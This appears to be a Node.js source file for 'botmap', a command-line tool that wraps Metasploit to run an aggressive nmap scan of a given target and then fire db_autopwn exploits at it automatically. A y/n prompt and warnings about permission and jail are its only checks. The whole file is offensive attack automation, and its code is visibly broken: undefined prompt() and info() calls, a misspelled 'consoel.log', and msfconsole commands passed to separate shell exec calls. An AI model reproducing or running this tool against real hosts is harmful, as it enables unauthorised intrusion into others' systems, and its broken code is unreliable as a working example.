import fs from 'fs'
import { exec } from 'child_process'
import c from 'colors/safe'
import { prompt as p } from 'prompt'

//set theme
c.setTheme({
 silly: 'rainbow',
 input: 'grey',
 verbose: 'cyan',
 prompt: 'grey',
 info: 'green',
 data: 'grey',
 help: 'cyan',
 warn: 'yellow',
 debug: 'blue',
 error: 'red'
})

//make sure that the user know what he's doing
function userAuth() {
 console.warn(c.warn("Note,that you need the permission of the target's owner !"))
 console.warn(c.warn('Are you sure you want to scan and attack: \n' + target))
 console.log(c.prompt('Press y to continue'))
let input = prompt()

if (input != 'y') {
  console.log(info('Maybe a wise decision..'))
  process.exit(1)
}
}

//perform exploit
function exploit(target) {
 console.log(c.info('Starting ...'))
 console.warn(c.warn('Once again... I hope you now what you are doing...'))
  //start postgresql
 exec('service postgresql start', (err, stdout, stderr) => {
   if (err || stderr) {
    let error = err || stderr
    console.error(c.error('Could not start postgresql! \n' + error))
    process.exit(1)
   } else {
    console.log(c.info('started postgresql'))
   }
  })
  //start msf
 exec('msfconsole', (err, stdout, stderr) => {
  if (err || stderr) {
   let error = err || stderr
   console.error(c.error('Could not initialize msfdb! \n' + error))
   process.exit(1)
  } else {
   console.log(c.info('started msf'))
  }
 })
 exec('workspace botmap', (err, stdout, stderr) => {
  if (err || stderr) {
   let error = err || stderr
   console.error(c.error('Error\n' + error))
   console.error(c.error('Running "botmap setup" may fix this...'))
   process.exit(1)
  } else {
   console.log(c.info('switched workspace'))
  }
 })
 console.log(c.info('Starting scan...'))
 exec('db_nmap -sS -sV -sU -n -O ' + target, (err, stdout, stderr) => {
  if (err || stderr) {
   let error = err || stderr
   console.error(c.error('Could not scan target \n' + error))
   process.exit(1)
  } else {
   console.log(c.info('scan finished'))
  }
 })
 exec('db_hosts', (err, stdout, stderr) => {
  if (err || stderr) {
   let error = err || stderr
   console.error(c.error('Could not get host info... \n' + error))
   process.exit(1)
  } else {
   console.log(c.info('HOST:' + stdout))
  }
 })
 console.warn(c.warn('Note that the following action can bring you to jail ! \n Botmap can not stop the action once it started !'))
 exec('db_autopwn -p -t -e', (err, stdout, stderr) => {
  if (err || stderr) {
   let error = err || stderr
   console.error(c.error('Can not pwn the target... \n' + error))
   process.exit(1)
  } else {
   console.log(c.info('Exploit started... \n You will have a session if any of the exploits worked...'))
  }
 })
}




function setup() {
  console.log(c.info('Botmap is setting up a db workspace...'))
  exec('service postgresql start', (err, stdout, stderr) => {
   if (err || stderr) {
    let error = err || stderr
    console.error(c.error('Could not start postgresql \n' + error))
    process.exit(1)
   } else {
    console.log(c.info('started postgresql'))
   }
  })
  exec('service metasploit start', (err, stdout, stderr) => {
   if (err || stderr) {
    let error = err || stderr
    console.error(c.error('Could not start msf \n' + error))
    process.exit(1)
   } else {
    console.log(c.info('started msf'))
   }
  })
  exec('workspace -a botmap', (err, stdout, stderr) => {
   if (err || stderr) {
    let error = err || stderr
    console.error(c.error('Could not create workspace\n' + error))
    process.exit(1)
   } else {
    console.log(c.info('created workspace'))
   }
  })
  exec('workspace botmap', (err, stdout, stderr) => {
   if (err || stderr) {
    let error = err || stderr
    console.error(c.error('Could not switch to workspace \n' + error))
    process.exit(1)
   } else {
    console.log(c.info('switched workspace'))
   }
  })
  exec('exit', (err, stdout, stderr) => {
   if (err || stderr) {
    let error = err || stderr
    console.error(c.error('Could not exit msfdb \n' + error))
    process.exit(1)
   } else {
    console.log(c.info('exited mdfdb'))
   }
  })
  consoel.log(c.silly('Setup complete !'))
 }

let userArgs = process.argv.slice(2)
let target
 //argument handling, a bit of small talk, blabla
if (userArgs[0] == 'target' || userArgs[0] == '-t') {
  //botmap target [arget]
 target = userArgs[1]
 userAuth()
 exploit(target)
} else if (userArgs[0] == 'info' || userArgs[0] == 'about') {
  //botmap info | botmap about
 console.log(c.info('------------------------------------------'))
 console.log(c.info('Author: Coretool'))
 console.log(c.info('Version: 0.1.0'))
 console.log(c.info('License: MIT'))
 console.log(c.info('Note that I am not responsible \n for what you do with botmap.'))
 console.log(c.info('------------------------------------------'))
 process.exit(0)
} else if (userArgs[0] == 'help' || userArgs[0] == '-h') {
  //botmap help | botmap -h
 console.log(c.help('------------------------------------------'))
 console.log(c.help('botmap [command] [argument] where: '))
 console.log(c.help('command is one of the following\n target [traget ip]: set target, shoot and forget \n about : display the info about botmap \n clean : to clean the temp.json \n help to display this menu '))
 console.log(c.help('------------------------------------------'))
} else if (userArgs[0] == 'setup') {
  //botmap setup
 setup()
} else {
  //botmap [wrong args]
  console.error(c.red('Unknownen Argument(s)'))
  process.exit(1)
}
